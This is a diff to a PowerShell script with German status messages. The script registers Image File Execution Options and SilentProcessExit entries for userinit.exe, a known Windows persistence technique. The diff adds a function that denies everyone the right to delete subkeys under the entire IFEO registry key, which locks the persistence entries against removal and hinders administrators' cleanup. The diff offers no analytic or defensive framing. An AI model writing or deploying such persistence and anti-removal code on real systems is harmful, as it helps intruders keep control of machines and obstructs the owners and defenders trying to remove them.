@@ -9,6 +9,7 @@ $targetProcess = "userinit.exe"
 
 $ifeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$targetProcess"
 $spePath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\$targetProcess"
+$ifeoParentPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
 
 function Set-RegistryDenyDelete {
     param ([string]$RegistryPath)
@@ -61,6 +62,41 @@ function Set-RegistryDenyDelete {
 }
 
 
+function Set-RegistryDenyDeleteSubkeys {
+    param ([string]$RegistryPath)
+
+    $cleanPath = $RegistryPath -replace "^HKLM:\\", ""
+    try {
+        $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
+            $cleanPath,
+            [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
+            [System.Security.AccessControl.RegistryRights]::ChangePermissions
+        )
+
+        if ($null -eq $key) {
+            Write-Warning "    Konnte Parent nicht öffnen: $RegistryPath"
+            return
+        }
+
+        $acl = $key.GetAccessControl()
+        $rule = New-Object System.Security.AccessControl.RegistryAccessRule(
+            "Everyone",
+            [System.Security.AccessControl.RegistryRights]::DeleteSubdirectories,
+            [System.Security.AccessControl.InheritanceFlags]::None,
+            [System.Security.AccessControl.PropagationFlags]::None,
+            [System.Security.AccessControl.AccessControlType]::Deny
+        )
+        $acl.AddAccessRule($rule)
+        $key.SetAccessControl($acl)
+        $key.Close()
+
+        Write-Host "    [+] Deny DeleteSubdirectories auf Parent gesetzt." -ForegroundColor Green
+    } catch {
+        Write-Error "    Fehler bei $RegistryPath`: $_"
+    }
+}
+
+
 try {
     # IFEO-Schluessel erstellen
     New-Item -Path $ifeoPath -Force
@@ -93,6 +129,7 @@ try {
     # ACL auf beide Registry-Schluessel setzen
     Set-RegistryDenyDelete $ifeoPath
     Set-RegistryDenyDelete $spePath
+    Set-RegistryDenyDeleteSubkeys $ifeoParentPath
 
 } catch {
     Write-Host "IFEO was not successful: $_" -ForegroundColor Yellow
